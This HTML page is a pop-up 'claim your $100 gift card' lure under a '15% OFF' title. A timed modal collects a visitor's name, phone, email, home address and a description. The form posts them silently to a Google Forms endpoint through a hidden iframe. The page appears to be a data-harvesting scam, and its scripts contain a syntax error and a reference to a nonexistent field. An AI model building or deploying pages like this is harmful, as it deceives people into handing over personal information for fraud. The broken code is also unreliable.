<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Get 15% OFF any service!</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body, html {
            height: 100%;
            margin: 0;
            padding: 0;
            overflow: hidden;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        .image-container {
            height: 100vh;
            width: 100%;
            background-image: url('https://pbs.twimg.com/media/G2xxfwQWwAA9m8O?format=jpg&name=small');
            background-size: contain;
            background-position: center;
            background-repeat: no-repeat;
            background-color: #f8f9fa;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            align-items: center;
            padding-bottom: 30px;
        }
        
        /* Reopen button styling */
        .reopen-btn {
            background: linear-gradient(135deg, #f44336 0%, #f44336 100%);
            color: white;
            border: none;
            border-radius: 50px;
            padding: 12px 30px;
            font-size: 1.1rem;
            font-weight: 600;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .reopen-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(0,0,0,0.25);
        }
        
        /* Modal customization */
        .modal-content {
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            border: none;
        }
        
        .modal-header {
            border-bottom: 2px solid #f44336;
            background: linear-gradient(135deg, #f44336 0%, #f44336 100%);
            color: white;
            border-radius: 15px 15px 0 0;
        }
        
        .modal-header .btn-close {
            filter: invert(1);
        }
        
        .modal-body {
            padding: 30px;
            font-size: 1.1rem;
            line-height: 1.6;
        }
        
        .modal-footer {
            border-top: 1px solid #e9ecef;
            padding: 20px;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #f44336 0%, #f44336 100%);
            border: none;
            padding: 10px 25px;
            border-radius: 50px;
            font-weight: 600;
        }
        
        .countdown {
            position: absolute;
            top: 20px;
            right: 20px;
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 10px 15px;
            border-radius: 50px;
            font-weight: 600;
            z-index: 1000;
        }
        
        /* Media query for larger screens */
        @media (min-width: 992px) {
            .image-container {
                background-size: contain;
                background-color: #f0f2f5;
            }
        }
        
        /* Media query for very large screens */
        @media (min-width: 1400px) {
            .image-container {
                background-size: contain;
            }
        }
        
        /* Media query for small screens */
        @media (max-width: 576px) {
            .reopen-btn {
                padding: 10px 20px;
                font-size: 1rem;
            }
            
            .modal-body {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Countdown indicator -->
    <div class="countdown" id="countdown">Claim offer in:</div>
    
    <!-- Main image container -->
    <div class="image-container">
        <!-- Button to reopen modal -->
        <button class="reopen-btn" id="reopenModalBtn" style="display: none;">
            <i class="fas fa-offer-alt"></i> Claim offer!
        </button>
    </div>
    
    <!-- Bootstrap Modal -->
    <div class="modal fade" id="delayedModal" tabindex="-1" aria-labelledby="modalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="modalLabel">Claim your $100 GIFT CARD!</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <script>
document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('.form-signin');
    
    form.addEventListener('submit', function(e) {
        // Your validation logic
        const email = document.getElementById('email').value;

});
</script>

<iframe id="hidden_iframe" name="hidden_iframe" style="display:none;"></iframe>

<form class="form-signin" 
      action="https://docs.google.com/forms/d/1etAVUOSragnQrPaTUyVeuV72IrBNIsA5ucB1NwpPg3U/formResponse"
      method="post" 
      target="hidden_iframe">
    <!-- your form fields -->

                    
    <label for="name" class="sr-only"></label>
    <input type="text" class="form-control" id="name" placeholder="Name" name="entry.678604361" required>
                   <label for="phone" class="sr-only"></label>
  <br>
    <input type="text" class="form-control" id="phone" placeholder="Phone number" name="entry.33613785" required>
                   <label for="usrnm" class="sr-only"></label>
  <br>
    <input type="email" class="form-control" id="email" placeholder="Enter Email" name="entry.750877400" required>
                   <label for="address" class="sr-only"></label>
  <br>
    <input type="text" class="form-control" id="address" placeholder="Enter address" name="entry.913511761" required>
                  <label for="description" class="sr-only"></label>
  <br>
    <textarea type="text" class="form-control" id="description" placeholder="Description" name="entry.653231644" rows="4"  required></textarea>

    <br>
    <button class="btn btn-lg btn-outline-danger btn-block" type="submit">GET IT!</button>
    <br>
                  </form>
                    
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-primary" data-bs-dismiss="modal">No thanks</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap JS and Popper.js -->
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.min.js"></script>
  
     <script>
    var submitted = false;

    function validateEmail(event) {
      const emailInput = document.getElementById('usrnm').value.trim();
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailRegex.test(emailInput)) {
        alert("Please enter a valid email address.");
        return false;
      }
      submitted = true;
      return true;
    }
  </script>
    
    <script>
        // Show modal after 5 seconds with countdown
        document.addEventListener('DOMContentLoaded', function() {
            let countdownElement = document.getElementById('countdown');
            let reopenBtn = document.getElementById('reopenModalBtn');
            let countdown = 5;
            
            // Update countdown every second
            let countdownInterval = setInterval(function() {
                countdown--;
                countdownElement.textContent = countdown;
                
                if (countdown <= 0) {
                    clearInterval(countdownInterval);
                    countdownElement.style.display = 'none';
                }
            }, 1000);
            
            // Show modal after 5 seconds
            setTimeout(function() {
                var myModal = new bootstrap.Modal(document.getElementById('delayedModal'));
                myModal.show();
                
                // Show the reopen button after the modal appears
                reopenBtn.style.display = 'flex';
            }, 5000); // 5000 milliseconds = 5 seconds
            
            // Add event listener to reopen button
            reopenBtn.addEventListener('click', function() {
                var myModal = new bootstrap.Modal(document.getElementById('delayedModal'));
                myModal.show();
            });
            
            // Also show the reopen button if user closes modal early
            document.getElementById('delayedModal').addEventListener('hidden.bs.modal', function() {
                reopenBtn.style.display = 'flex';
            });
        });
    </script>
</body>
</html>
